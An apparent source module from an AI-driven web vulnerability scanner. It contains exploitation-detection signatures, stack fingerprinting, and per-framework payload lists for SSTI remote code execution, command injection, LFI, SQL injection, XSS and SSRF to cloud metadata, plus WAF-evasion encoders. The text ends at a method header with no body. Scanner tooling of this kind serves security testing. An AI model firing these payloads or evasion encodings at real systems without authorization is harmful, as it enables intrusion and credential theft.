"""
agents/tools.py — Smart Built-in Tool Suite

Custom tools that make the AI smarter without external dependencies.
These are pure-Python analysis utilities that enhance precision:

1. ResponseAnalyzer   — Smart HTTP response fingerprinting
2. TechDetector       — Technology stack detection from headers/body
3. PayloadIntelligence — Context-aware payload selection
4. FindingCorrelator  — Cross-finding intelligence
"""

from __future__ import annotations

import hashlib
import re
import subprocess
import base64
import html
import json
from collections import Counter, defaultdict
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, unquote
from html.parser import HTMLParser
from binascii import hexlify, unhexlify

import httpx
from rich.console import Console

try:
    from playwright.async_api import async_playwright  # type: ignore
except ImportError:
    async_playwright = None

console = Console()


# ═══════════════════════════════════════════════════════════════════════
# Tool 1: Response Analyzer — Smart fingerprinting for exploit verification
# ═══════════════════════════════════════════════════════════════════════

class ResponseAnalyzer:
    """Analyzes HTTP responses to detect successful exploitation, info leaks, and anomalies."""

    # Definitive exploitation signatures grouped by vuln type
    SIGNATURES = {
        "command_injection": {
            "definitive": [
                r"uid=\d+\(\w+\)",                         # Unix id output
                r"root:x:0:0",                              # /etc/passwd
                r"www-data",                                # Common web user
                r"\b(?:Linux|Darwin|FreeBSD)\s+\S+\s+\d+", # uname -a
                r"(?:Windows|MINGW|MSYS)",                  # Windows indicators
                r"Directory of [A-Z]:\\",                    # Windows dir output
                r"Volume Serial Number",                    # Windows dir
                r"total \d+\s+drwx",                        # ls -la output
            ],
            "heuristic": [
                r"/bin/(?:bash|sh|zsh)",
                r"/usr/(?:bin|local|sbin)/",
                r"(?:HOME|PATH|USER)=",
            ]
        },
        "sql_injection": {
            "definitive": [
                r"SQL syntax.*?MySQL",
                r"Warning.*?\bmysql_",
                r"ORA-\d{5}",
                r"Microsoft OLE DB Provider",
                r"ODBC SQL Server Driver",
                r"SQLite3::query",
                r"pg_query\(\).*?failed",
                r"SQLSTATE\[\w+\]",
                r"Unclosed quotation mark",
                r"quoted string not properly terminated",
                r"syntax error at or near",
            ],
            "heuristic": [
                r"mysql_fetch",
                r"num_rows",
                r"Column.*?not found",
                r"Unknown column",
            ]
        },
        "xss": {
            "definitive": [
                r"<script[^>]*>alert\(",
                r"onerror\s*=\s*[\"']?alert",
                r"<svg[^>]*onload",
                r"<img[^>]*onerror",
                r"javascript:alert",
                r"<iframe[^>]*src\s*=",
                r"<embed[^>]*src\s*=",
                r"<object[^>]*data\s*=",
                r"on(?:load|error|mouseover|click|focus|blur|submit)\s*=",
                r"<meta[^>]*http-equiv\s*=\s*refresh",
            ],
            "heuristic": [
                r"<script",  # Generic script tag reflection
                r"<iframe",
                r"<embed",
                r"<object",
                r"javascript:",
            ]
        },
        "lfi": {
            "definitive": [
                r"root:x:0:0:root",                  # /etc/passwd
                r"\[boot loader\]",                  # win.ini
                r"\[extensions\]",                   # win.ini
                r";\s*for 16-bit app support",       # system.ini
                r"# /etc/hosts",
                r"127\.0\.0\.1\s+localhost",         # hosts file
            ],
            "heuristic": [
                r"/etc/(passwd|shadow|hosts)",
                r"C:\\Windows\\",
            ]
        },
        "ssti": {
            "definitive": [
                r"\b49\b",                            # 7*7
                r"\b7777777\b",                       # 7*7*7*7*7*7*7
                r"<class\s+'",                        # Python class traversal
                r"__class__",
                r"__subclasses__",
                r"config\s*=\s*<",                    # Flask config leak
            ],
            "heuristic": []
        },
        "ssrf": {
            "definitive": [
                r"ami-id",                           # AWS metadata
                r"instance-type",                    # AWS metadata
                r"compute\.googleapis\.com",          # GCP metadata
                r"metadata\.google\.internal",
            ],
            "heuristic": [
                r"internal\s+server\s+error",
                r"connection\s+refused",
            ]
        },
    }

    @classmethod
    def analyze(
        cls,
        response_text: str,
        status_code: int,
        vuln_type: str = "",
        payload_sent: str = "",
    ) -> Dict:
        """Analyze a response for exploitation evidence.
        
        Returns:
            {
                "exploited": bool,
                "confidence": float,     # 0.0 - 1.0
                "evidence_type": str,    # "definitive" | "heuristic" | "reflection" | "none"
                "matched_signatures": [...],
                "details": str,
            }
        """
        text = response_text
        text_lower = text.lower()
        matched = []
        evidence_type = "none"
        confidence = 0.0

        # 0. Pre-process: decode HTML entities, URL encoding, base64
        decoded_variants = cls._generate_decoded_variants(text)
        all_variants = [text] + decoded_variants

        # 1. Check definitive signatures for the specific vuln type
        if vuln_type and vuln_type in cls.SIGNATURES:
            sigs = cls.SIGNATURES[vuln_type]
            for variant in all_variants:
                for pattern in sigs["definitive"]:
                    if re.search(pattern, variant, re.IGNORECASE):
                        matched.append(f"[DEFINITIVE] {pattern}")
                        evidence_type = "definitive"
                        confidence = max(confidence, 0.95)
                        break
                if confidence >= 0.95:
                    break

            if confidence < 0.9:
                for variant in all_variants:
                    for pattern in sigs["heuristic"]:
                        if re.search(pattern, variant, re.IGNORECASE):
                            matched.append(f"[HEURISTIC] {pattern}")
                            if evidence_type != "definitive":
                                evidence_type = "heuristic"
                            confidence = max(confidence, 0.6)
                            break

        # 2. Check ALL vuln types if no specific type matched
        if not matched:
            for vtype, sigs in cls.SIGNATURES.items():
                for variant in all_variants:
                    for pattern in sigs["definitive"]:
                        if re.search(pattern, variant, re.IGNORECASE):
                            matched.append(f"[DEFINITIVE:{vtype}] {pattern}")
                            evidence_type = "definitive"
                            confidence = max(confidence, 0.90)
                            break

        # 3. Payload reflection check
        if payload_sent and len(payload_sent) > 3 and payload_sent in text:
            matched.append(f"[REFLECTION] Payload reflected: {payload_sent[:50]}")
            if evidence_type == "none":
                evidence_type = "reflection"
            confidence = max(confidence, 0.7)

        # 4. Error-based indicators
        if status_code >= 500:
            matched.append(f"[ERROR] Server returned {status_code}")
            confidence = max(confidence, 0.3)

        return {
            "exploited": confidence >= 0.6,
            "confidence": confidence,
            "evidence_type": evidence_type,
            "matched_signatures": matched[:5],  # Top 5
            "details": "; ".join(matched[:5]) if matched else "No exploitation evidence found",
        }

    @classmethod
    def _generate_decoded_variants(cls, text: str) -> List[str]:
        """Generate HTML entity and encoding variants to catch bypasses."""
        variants = []

        # HTML entity decoding (e.g., &#x3c; → <)
        try:
            variants.append(html.unescape(text))
        except Exception:
            pass

        # URL decoding (e.g., %3c → <)
        try:
            variants.append(unquote(text))
        except Exception:
            pass

        # Double URL decoding
        try:
            variants.append(unquote(unquote(text)))
        except Exception:
            pass

        # Base64 detection and decoding
        if cls._looks_like_base64(text):
            try:
                decoded = base64.b64decode(text).decode('utf-8', errors='ignore')
                variants.append(decoded)
            except Exception:
                pass

        # Unicode escape sequences (\u0041 → A)
        try:
            variants.append(text.encode('utf-8').decode('unicode-escape'))
        except Exception:
            pass

        return variants

    @classmethod
    def _looks_like_base64(cls, text: str) -> bool:
        """Quick heuristic to detect if text might be base64."""
        # Base64 typically 75%+ alphanumeric + /+= chars
        if len(text) < 16:
            return False
        base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
        ratio = sum(1 for c in text if c in base64_chars) / len(text)
        return ratio > 0.75


# ═══════════════════════════════════════════════════════════════════════
# Tool 2: Tech Detector — Fingerprint the technology stack
# ═══════════════════════════════════════════════════════════════════════

class TechDetector:
    """Detect technology stack from HTTP response headers and body."""

    HEADER_FINGERPRINTS = {
        "Server": {
            r"nginx": "Nginx",
            r"apache": "Apache",
            r"gunicorn": "Gunicorn (Python)",
            r"werkzeug": "Werkzeug (Flask/Python)",
            r"express": "Express (Node.js)",
            r"iis": "IIS (Windows)",
            r"cloudflare": "Cloudflare",
            r"openresty": "OpenResty (Nginx+Lua)",
        },
        "X-Powered-By": {
            r"php": "PHP",
            r"asp\.net": "ASP.NET",
            r"express": "Express (Node.js)",
            r"servlet": "Java Servlet",
            r"flask": "Flask (Python)",
        },
    }

    # Version extraction patterns
    VERSION_PATTERNS = {
        r"nginx/(\d+\.\d+\.\d+)": ("Nginx", "version"),
        r"Apache/(\d+\.\d+\.\d+)": ("Apache", "version"),
        r"Werkzeug/(\d+\.\d+\.\d+)": ("Werkzeug", "version"),
        r"Express/(\d+\.\d+\.\d+)": ("Express", "version"),
        r"Server:\s*PHP/(\d+\.\d+\.\d+)": ("PHP", "version"),
    }

    # Language detection patterns
    LANGUAGE_PATTERNS = {
        r"\.php(?:\?|$|/)": "PHP",
        r"\.asp(?:x)?(?:\?|$|/)": "ASP.NET",
        r"\.py(?:\?|$|/)": "Python",
        r"\.jar(?:\?|$|/)": "Java",
        r"\.jsp(?:\?|$|/)": "Java JSP",
        r"\.do(?:\?|$|/)": "Java",
        r"\.rb(?:\?|$|/)": "Ruby",
        r"\.go(?:\?|$|/)": "Go",
    }

    # Database detection patterns
    DATABASE_PATTERNS = {
        r"mysql_fetch|mysql_error|SQL syntax.*?MySQL": ("MySQL", "critical"),
        r"PostgreSQL|pg_query|SQLSTATE": ("PostgreSQL", "critical"),
        r"SQLite": ("SQLite", "info"),
        r"MongoDB|mongodb": ("MongoDB", "info"),
        r"Oracle|ORA-\d{5}": ("Oracle", "critical"),
        r"MSSQL|SQLSERVER|SqlServer": ("MSSQL", "critical"),
    }

    # Cloud platform detection
    CLOUD_PATTERNS = {
        r"x-amz-|amazon|aws|s3": "AWS",
        r"x-goog-|google|googleapis|appspot": "Google Cloud",
        r"x-azure|azure|cloudapp|azurewebsites": "Microsoft Azure",
        r"heroku": "Heroku",
        r"netlify": "Netlify",
        r"vercel": "Vercel",
        r"railway|render|fly\.io": "Serverless Platform",
    }

    BODY_FINGERPRINTS = {
        r"Werkzeug Debugger": ("Werkzeug Debug Console", "critical"),
        r"Django Debug": ("Django Debug Mode", "critical"),
        r"Laravel": ("Laravel Framework", "info"),
        r"Ruby on Rails": ("Ruby on Rails", "info"),
        r"Spring Boot": ("Spring Boot (Java)", "info"),
        r"__next": ("Next.js", "info"),
        r"react-root|_react": ("React", "info"),
        r"wp-content|wordpress": ("WordPress", "info"),
        r"joomla": ("Joomla", "info"),
        r"drupal": ("Drupal", "info"),
        r"csrf_token|csrfmiddlewaretoken": ("CSRF Protection Detected", "info"),
        r"jwt|Bearer\s+eyJ": ("JWT Authentication", "info"),
    }

    @classmethod
    async def detect(cls, url: str) -> Dict:
        """Detect technology stack for a target URL.
        
        Returns:
            {
                "technologies": ["Flask", "Werkzeug", ...],
                "versions": {"Nginx": "1.20.1", ...},
                "server": "Werkzeug (Flask/Python)",
                "framework": "Flask",
                "language": "Python",
                "database": "MySQL",
                "cloud_provider": "AWS",
                "security_features": ["CSRF Protection"],
                "risk_factors": ["Werkzeug Debug Console active"],
                "headers": {...}
            }
        """
        result = {
            "technologies": [],
            "versions": {},
            "server": "",
            "framework": "",
            "language": "",
            "database": "",
            "cloud_provider": "",
            "security_features": [],
            "risk_factors": [],
            "headers": {},
        }

        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
                resp = await client.get(url)
                result["headers"] = dict(resp.headers)

                # Header fingerprinting + version extraction
                for header_name, patterns in cls.HEADER_FINGERPRINTS.items():
                    value = resp.headers.get(header_name, "")
                    for pattern, tech in patterns.items():
                        if re.search(pattern, value, re.IGNORECASE):
                            result["technologies"].append(tech)
                            if header_name == "Server":
                                result["server"] = tech

                # Version extraction
                for pattern, (tech, _) in cls.VERSION_PATTERNS.items():
                    match = re.search(pattern, str(resp.headers), re.IGNORECASE)
                    if match:
                        result["versions"][tech] = match.group(1)

                # Body fingerprinting
                for pattern, (tech, severity) in cls.BODY_FINGERPRINTS.items():
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        result["technologies"].append(tech)
                        if severity == "critical":
                            result["risk_factors"].append(f"{tech} active")
                        elif "csrf" in tech.lower() or "jwt" in tech.lower():
                            result["security_features"].append(tech)

                # Language detection from URL patterns
                for pattern, lang in cls.LANGUAGE_PATTERNS.items():
                    if re.search(pattern, url, re.IGNORECASE):
                        result["language"] = lang
                        break

                # Database detection
                for pattern, (db, severity) in cls.DATABASE_PATTERNS.items():
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        result["database"] = db
                        if severity == "critical":
                            result["risk_factors"].append(f"{db} detected with error messages")

                # Cloud provider detection
                for pattern, provider in cls.CLOUD_PATTERNS.items():
                    if re.search(pattern, str(resp.headers).lower()) or re.search(pattern, resp.text.lower()):
                        result["cloud_provider"] = provider
                        break

                # Deduplicate
                result["technologies"] = list(dict.fromkeys(result["technologies"]))

        except Exception as e:
            result["error"] = str(e)

        return result


# ═══════════════════════════════════════════════════════════════════════
# Tool 3: Payload Intelligence — Context-aware payload selection
# ═══════════════════════════════════════════════════════════════════════

class PayloadIntelligence:
    """Selects the best payloads based on detected technology and context.
    
    Instead of blindly fuzzing with everything, this tool picks
    the right payloads for the detected stack + encoding variants.
    """

    # Encoding functions for WAF evasion
    @staticmethod
    def encode_hex(payload: str) -> str:
        """Convert to hex escape sequences: id → \\x69\\x64"""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def encode_unicode(payload: str) -> str:
        """Convert to Unicode escapes: id → \\u0069\\u0064"""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def encode_base64(payload: str) -> str:
        """Encode to base64"""
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def encode_double_url(payload: str) -> str:
        """Double URL encoding for bypass"""
        from urllib.parse import quote
        return quote(quote(payload))

    @staticmethod
    def inject_comments_sql(payload: str) -> str:
        """SQL comment injection: space → /**/"""
        return payload.replace(" ", "/**/")

    @staticmethod
    def inject_comments_shell(payload: str) -> str:
        """Shell comment injection: space → ${IFS}"""
        return payload.replace(" ", "${IFS}")

    @staticmethod
    def case_variation(payload: str) -> str:
        """Case variation for bypass: id → Id or iD"""
        if payload.islower():
            return payload.capitalize()
        return payload.lower()

    # Encoding variants mapping
    ENCODING_VARIANTS = {
        "none": lambda p: p,
        "url_encode": lambda p: __import__('urllib.parse', fromlist=['quote']).quote(p),
        "double_url_encode": encode_double_url.__func__,
        "hex": encode_hex.__func__,
        "unicode": encode_unicode.__func__,
        "base64": encode_base64.__func__,
    }

    # Technology-specific payload priorities
    TECH_PAYLOADS = {
        "Flask": {
            "ssti": [
                {"payload": "{{7*7}}", "category": "basic"}, 
                {"payload": "{{config.items()}}", "category": "config_leak"},
                {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "category": "rce"},
                {"payload": "{{request.environ}}", "category": "info_leak"},
                {"payload": "{{lipsum.__globals__['os'].popen('id').read()}}", "category": "rce"},
            ],
            "command_injection": [
                {"payload": "; id", "category": "cmd_basic"},
                {"payload": "| id", "category": "cmd_basic"},
                {"payload": "$(id)", "category": "cmd_bypass"},
                {"payload": "`id`", "category": "cmd_bypass"},
            ],
        },
        "PHP": {
            "lfi": [
                {"payload": "php://filter/convert.base64-encode/resource=index", "category": "wrapper"},
                {"payload": "../../../etc/passwd", "category": "basic"},
                {"payload": "php://input", "category": "wrapper"},
                {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "category": "wrapper"},
            ],
            "command_injection": [
                {"payload": "; id", "category": "cmd_basic"},
                {"payload": "| id", "category": "cmd_basic"},
                {"payload": "; cat /etc/passwd", "category": "cmd_chain"},
                {"payload": "`;id`", "category": "cmd_bypass"},
                {"payload": "$(id)", "category": "cmd_bypass"},
            ],
            "sql_injection": [
                {"payload": "' OR '1'='1", "category": "auth_bypass"},
                {"payload": "' UNION SELECT NULL--", "category": "union"},
                {"payload": "1' AND SLEEP(5)--", "category": "time_based"},
            ],
        },
        "Node.js": {
            "ssti": [
                {"payload": "${7*7}", "category": "basic"},
                {"payload": "#{7*7}", "category": "basic"},
                {"payload": "{{constructor.constructor('return this')()}}", "category": "rce"}
            ],
            "command_injection": [
                {"payload": "; id", "category": "cmd_basic"},
                {"payload": "| id", "category": "cmd_basic"},
                {"payload": "$(id)", "category": "cmd_bypass"},
                {"payload": "require('child_process').execSync('id')", "category": "language_exec"},
            ],
            "sql_injection": [
                {"payload": "' OR '1'='1", "category": "auth_bypass"},
                {"payload": "' OR 1=1--", "category": "auth_bypass"},
            ],
        },
        "ASP.NET": {
            "sql_injection": [
                {"payload": "' OR '1'='1", "category": "auth_bypass"},
                {"payload": "'; WAITFOR DELAY '0:0:5'--", "category": "time_based"},
                {"payload": "' UNION SELECT NULL--", "category": "union"},
            ],
            "lfi": [
                {"payload": "..\\..\\..\\..\\windows\\win.ini", "category": "basic"},
                {"payload": "..\\..\\..\\..\\windows\\system.ini", "category": "basic"},
            ],
        },
        "Java": {
            "ssti": [
                {"payload": "${7*7}", "category": "basic"},
                {"payload": "#{7*7}", "category": "basic"},
                {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "category": "rce"},
            ],
            "sql_injection": [
                {"payload": "' OR '1'='1", "category": "auth_bypass"},
                {"payload": "' AND 1=CONVERT(int, @@version)--", "category": "error_based"},
            ],
            "deserialization": [
                {"payload": "rO0ABX", "category": "ysoserial"},
                {"payload": "aced0005", "category": "java_native"},
            ],
        },
    }

    # Default payloads when no tech is detected
    DEFAULT_PAYLOADS = {
        "command_injection": [{"payload": "; id", "category": "cmd_basic"}, {"payload": "| id", "category": "cmd_basic"}, {"payload": "$(id)", "category": "cmd_bypass"}, {"payload": "`id`", "category": "cmd_bypass"}, {"payload": "&& id", "category": "cmd_chain"}, {"payload": "|| id", "category": "cmd_chain"}, {"payload": "\nid", "category": "cmd_chain"}],
        "sql_injection": [{"payload": "' OR '1'='1", "category": "auth_bypass"}, {"payload": "' OR 1=1--", "category": "auth_bypass"}, {"payload": "1' AND SLEEP(5)--", "category": "time_based"}, {"payload": "' UNION SELECT NULL--", "category": "union"}, {"payload": "1 AND 1=1", "category": "boolean"}, {"payload": "1 AND 1=2", "category": "boolean"}],
        "xss": [{"payload": '<script>alert(1)</script>', "category": "basic"}, {"payload": '"><img src=x onerror=alert(1)>', "category": "attribute"}, {"payload": '<svg/onload=alert(1)>', "category": "bypass"}],
        "ssti": [{"payload": "{{7*7}}", "category": "basic"}, {"payload": "${7*7}", "category": "basic"}, {"payload": "#{7*7}", "category": "basic"}, {"payload": "<%= 7*7 %>", "category": "basic"}],
        "lfi": [{"payload": "../../../etc/passwd", "category": "basic"}, {"payload": "../../../../etc/hosts", "category": "basic"}, {"payload": "..\\..\\..\\windows\\win.ini", "category": "basic"}],
        "ssrf": [{"payload": "http://127.0.0.1/", "category": "basic"}, {"payload": "http://169.254.169.254/latest/meta-data/", "category": "cloud_metadata"}, {"payload": "http://[::1]/", "category": "ipv6"}],
    }

    @classmethod
    def select_payloads(
        cls,
        vuln_type: str,
        technologies: Optional[List[str]] = None,
        param_name: str = "",
        max_payloads: int = 10,
        category_filter: Optional[str] = None,
        include_encoding_variants: bool = True,
    ) -> List[Dict]:
        """Select the best categorized payloads based on context.
        
        Returns:
            Ordered list of payload dictionaries with encoding variants, e.g.
            [{"payload": "...", "category": "cmd_basic", "encoding": "none"}], best-first
        """
        payloads = []
        technologies = technologies or []

        # 1. Add tech-specific payloads first (highest priority)
        for tech in technologies:
            for tech_key, vulns in cls.TECH_PAYLOADS.items():
                if tech_key.lower() in tech.lower():
                    if vuln_type in vulns:
                        payloads.extend(vulns[vuln_type])

        # 2. Add default payloads
        if vuln_type in cls.DEFAULT_PAYLOADS:
            payloads.extend(cls.DEFAULT_PAYLOADS[vuln_type])

        # 3. Param-name hints: boost certain types
        param_lower = param_name.lower()
        if param_lower in ("cmd", "command", "exec", "run", "shell", "system"):
            if vuln_type == "command_injection":
                payloads = [{"payload": "; id", "category": "cmd_basic"}, {"payload": "| id", "category": "cmd_basic"}, {"payload": "$(id)", "category": "cmd_bypass"}] + payloads
        elif param_lower in ("file", "path", "doc", "uri", "src", "page", "template"):
            if vuln_type == "lfi":
                payloads = [{"payload": "../../../etc/passwd", "category": "basic"}, {"payload": "php://filter/convert.base64-encode/resource=index", "category": "wrapper"}] + payloads
        elif param_lower in ("q", "query", "search", "s", "term"):
            if vuln_type == "sql_injection":
                payloads = [{"payload": "' OR '1'='1", "category": "auth_bypass"}, {"payload": "' UNION SELECT NULL--", "category": "union"}] + payloads
            elif vuln_type == "xss":
                payloads = [{"payload": '<script>alert(1)</script>', "category": "basic"}] + payloads

        # 4. Deduplicate preserving order
        seen = set()
        unique = []
        for p in payloads:
            if category_filter and p.get("category") != category_filter:
                continue
            if p["payload"] not in seen:
                seen.add(p["payload"])
                unique.append(p)

        # 5. Generate encoding variants for WAF evasion
        if include_encoding_variants:
            final_payloads = []
            for p in unique[:max_payloads]:
                # Add original
                final_payloads.append({**p, "encoding": "none"})
                
                # Add encoding variants for command injection
                if vuln_type == "command_injection" or "cmd" in p.get("category", "").lower():
                    # Shell comment injection
                    final_payloads.append({
                        "payload": cls.inject_comments_shell(p["payload"]),
                        "category": p.get("category") + "_comment_evasion",
                        "encoding": "shell_comment"
                    })
                    # Hex encoding
                    final_payloads.append({
                        "payload": cls.encode_hex(p["payload"]),
                        "category": p.get("category") + "_hex",
                        "encoding": "hex"
                    })

                # SQL-specific variants
                elif vuln_type == "sql_injection" or "sql" in p.get("category", "").lower():
                    final_payloads.append({
                        "payload": cls.inject_comments_sql(p["payload"]),
                        "category": p.get("category") + "_comment_bypass",
                        "encoding": "sql_comment"
                    })
                    # Double URL encoding
                    final_payloads.append({
                        "payload": cls.encode_double_url(p["payload"]),
                        "category": p.get("category") + "_double_url",
                        "encoding": "double_url"
                    })

                # Generic URL encoding for others
                else:
                    final_payloads.append({
                        "payload": cls.encode_double_url(p["payload"]),
                        "category": p.get("category") + "_url_encoded",
                        "encoding": "double_url"
                    })
            
            return final_payloads[:max_payloads * 2]  # Allow more with variants

        return unique[:max_payloads]


# ═══════════════════════════════════════════════════════════════════════
# Tool 4: Finding Correlator — Cross-finding intelligence
# ═══════════════════════════════════════════════════════════════════════

class FindingCorrelator:
    """Correlates findings across agents to detect attack chains and reduce noise.
    
    Example: If we find both "Debug Console Exposed" and "Command Injection",
    the correlator notes these form an attack chain.
    """

    # Known attack chain patterns
    CHAINS = [
        {
            "name": "Debug Console → RCE",
            "stages": ["misconfiguration", "command_injection"],
            "description": "Exposed debug console enables remote code execution",
            "severity_boost": "critical",
        },
        {
            "name": "SQL Injection → Data Exfiltration",
            "stages": ["sql_injection", "sensitive_exposure"],
            "description": "SQL injection enables extraction of sensitive data",
            "severity_boost": "critical",
        },
        {
            "name": "LFI → Credential Theft",
            "stages": ["path_traversal", "hardcoded_creds"],
            "description": "Local file inclusion enables reading credential files",
            "severity_boost": "critical",
        },
        {
            "name": "SSRF → Cloud Metadata",
            "stages": ["ssrf", "sensitive_exposure"],
            "description": "SSRF enables access to cloud metadata service",
            "severity_boost": "critical",
        },
        {
            "name": "Auth Bypass → Privilege Escalation",
            "stages": ["auth_bypass", "broken_access"],
            "description": "Authentication bypass leads to unauthorized admin access",
            "severity_boost": "critical",
        },
        {
            "name": "SSTI → Remote Code Execution",
            "stages": ["ssti", "command_injection"],
            "description": "Server-side template injection escalated to arbitrary code execution",
            "severity_boost": "critical",
        },
        {
            "name": "Weak Crypto → Token Forgery → Impersonation",
            "stages": ["weak_crypto", "insecure_jwt"],
            "description": "Weak cryptographic implementation allows forging authentication tokens",
            "severity_boost": "critical",
        },
        {
            "name": "Deserialization → Remote Code Execution",
            "stages": ["deserialization"],
            "description": "Unsafe deserialization of user input leads to arbitrary code execution",
            "severity_boost": "critical",
        },
        {
            "name": "SQLi → Admin Access → RCE",
            "stages": ["sql_injection", "auth_bypass"],
            "description": "SQL injection extracts admin credentials, leading to admin panel access and RCE",
            "severity_boost": "critical",
        },
        {
            "name": "SSRF → Cloud Credential Theft → Lateral Movement",
            "stages": ["ssrf"],
            "description": "SSRF enables access to cloud metadata and IAM credentials for lateral movement",
            "severity_boost": "critical",
        },
        {
            "name": "XSS → Session Hijacking → Account Takeover",
            "stages": ["xss", "broken_access"],
            "description": "Cross-site scripting enables session theft and unauthorized account access",
            "severity_boost": "critical",
        },
        {
            "name": "Open Redirect → Phishing → Credential Theft",
            "stages": ["open_redirect"],
            "description": "Open redirect enables sophisticated phishing attacks using trusted domain",
            "severity_boost": "high",
        },
        # NEW CHAINS - Added for comprehensive coverage
        {
            "name": "Weak Password Reset → Account Takeover",
            "stages": ["weak_password_reset", "account_takeover"],
            "description": "Predictable password reset tokens enable account takeover",
            "severity_boost": "critical",
        },
        {
            "name": "API Key Exposure → Full Infrastructure Access",
            "stages": ["hardcoded_credentials", "api_key_exposure", "cloud_misconfiguration"],
            "description": "Leaked API keys provide direct access to cloud infrastructure",
            "severity_boost": "critical",
        },
        {
            "name": "Insecure GraphQL → Data Exfiltration",
            "stages": ["graphql_introspection", "broken_access", "sensitive_exposure"],
            "description": "Unauthenticated GraphQL introspection leads to full schema enumeration and data theft",
            "severity_boost": "critical",
        },
        {
            "name": "XXE Injection → Data Exfiltration",
            "stages": ["xxe", "sensitive_exposure"],
            "description": "XML external entity injection enables reading local files and internal resources",
            "severity_boost": "critical",
        },
        {
            "name": "Path Traversal → Source Code Disclosure",
            "stages": ["path_traversal", "source_code_disclosure"],
            "description": "Local file inclusion enables reading application source code containing secrets",
            "severity_boost": "critical",
        },
        {
            "name": "Insecure Direct Object Reference → Data Breach",
            "stages": ["broken_access", "sensitive_exposure"],
            "description": "IDOR allows accessing resources of other users without authorization",
            "severity_boost": "critical",
        },
        {
            "name": "Race Condition → Privilege Escalation",
            "stages": ["race_condition", "privilege_escalation"],
            "description": "Race condition in critical operations leads to unauthorized privilege gain",
            "severity_boost": "high",
        },
        {
            "name": "Prototype Pollution → XSS",
            "stages": ["prototype_pollution", "xss"],
            "description": "JavaScript prototype pollution taints objects and enables XSS",
            "severity_boost": "high",
        },
        {
            "name": "Unsafe File Upload → RCE",
            "stages": ["file_upload", "command_injection"],
            "description": "Unrestricted file upload enables executing arbitrary code on server",
            "severity_boost": "critical",
        },
        {
            "name": "CSRF → Unauthorized Actions",
            "stages": ["csrf", "privilege_escalation"],
            "description": "Cross-site request forgery enables performing unauthorized actions on behalf of users",
            "severity_boost": "high",
        },
        {
            "name": "Insecure Serialization → RCE",
            "stages": ["insecure_serialization", "command_injection"],
            "description": "Unsafe object serialization leads to arbitrary code execution",
            "severity_boost": "critical",
        },
        {
            "name": "Command Injection → Data Exfiltration",
            "stages": ["command_injection", "sensitive_exposure"],
            "description": "OS command injection enables reading sensitive configuration and data files",
            "severity_boost": "critical",
        },
        {
            "name": "Template Injection → RCE",
            "stages": ["template_injection", "command_injection"],
            "description": "Template injection in rendering engines enables code execution",
            "severity_boost": "critical",
        },
        {
            "name": "Logic Flaw → Privilege Escalation",
            "stages": ["broken_logic", "privilege_escalation"],
            "description": "Application logic errors enable unauthorized privilege gain",
            "severity_boost": "high",
        },
        {
            "name": "Insecure Logging → Information Disclosure",
            "stages": ["logging_issues", "sensitive_exposure"],
            "description": "Improperly logged sensitive data becomes readable in log files",
            "severity_boost": "high",
        },
        {
            "name": "LDAP Injection → Authentication Bypass",
            "stages": ["ldap_injection", "auth_bypass"],
            "description": "LDAP injection in authentication enables bypassing access controls",
            "severity_boost": "critical",
        },
        {
            "name": "Weak Encryption → Credential Theft",
            "stages": ["weak_encryption", "hardcoded_credentials"],
            "description": "Weak or hardcoded encryption keys enable decrypting stored secrets",
            "severity_boost": "critical",
        },
        {
            "name": "Dependency Vulnerability → RCE",
            "stages": ["vulnerable_dependencies", "command_injection"],
            "description": "Vulnerable third-party libraries enable arbitrary code execution",
            "severity_boost": "critical",
        },
    ]

    @classmethod
    def correlate(cls, findings: list) -> List[Dict]:
        """Analyze findings for attack chains.
        
        Args:
            findings: List of Finding objects or dicts with category field
            
        Returns:
            List of detected attack chains
        """
        # Get all categories present
        categories = set()
        for f in findings:
            cat = getattr(f, "category", None) or (f.get("category") if isinstance(f, dict) else None)
            if cat:
                cat_val = cat.value if hasattr(cat, "value") else str(cat)
                categories.add(cat_val)

        detected_chains = []
        for chain in cls.CHAINS:
            stages_found = [s for s in chain["stages"] if s in categories]
            if len(stages_found) >= 2:
                detected_chains.append({
                    "chain_name": chain["name"],
                    "stages_found": stages_found,
                    "total_stages": len(chain["stages"]),
                    "description": chain["description"],
                    "severity_boost": chain["severity_boost"],
                })

        return detected_chains

    @classmethod
    def deduplicate_findings(cls, findings: list) -> Tuple[list, int]:
        """Remove duplicate findings based on (endpoint_path + category).
        
        Returns:
            (unique_findings, duplicates_removed)
        """
        seen = set()
        unique = []
        dupes = 0

        for f in findings:
            # Extract dedup key fields
            if hasattr(f, "url"):
                url = f.url or ""
                cat = f.category.value if hasattr(f.category, "value") else str(f.category)
            elif isinstance(f, dict):
                url = f.get("url", "")
                cat = f.get("category", "")
            else:
                unique.append(f)
                continue

            # Hash by endpoint path + category
            path = urlparse(url).path if url else (getattr(f, "file_path", "") or "")
            dedup_key = hashlib.md5(f"{path}||{cat}".encode()).hexdigest()

            if dedup_key not in seen:
                seen.add(dedup_key)
                unique.append(f)
            else:
                dupes += 1

        return unique, dupes


# ═══════════════════════════════════════════════════════════════════════
# Tool 5: HtmlReader — Content Extraction to reduce LLM Hallucination
# ═══════════════════════════════════════════════════════════════════════

class HtmlReader:
    """Fetches and cleans HTML from endpoints to provide visual context to AI."""

    @classmethod
    async def get_clean_html(cls, url: str) -> str:
        """Get clean readable text from HTML page."""
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                res = await client.get(url)
                html = res.text
                
                # Strip out scripts and styles to reduce token usage
                html = re.sub(r"<script.*?>.*?</script>", "", html, flags=re.IGNORECASE | re.DOTALL)
                html = re.sub(r"<style.*?>.*?</style>", "", html, flags=re.IGNORECASE | re.DOTALL)
                
                # Collapse whitespace
                html = re.sub(r"\s+", " ", html)
                
                return html.strip()
        except Exception as e:
            return f"Error retrieving HTML: {str(e)}"

    @classmethod
    async def extract_forms(cls, url: str) -> List[Dict]:
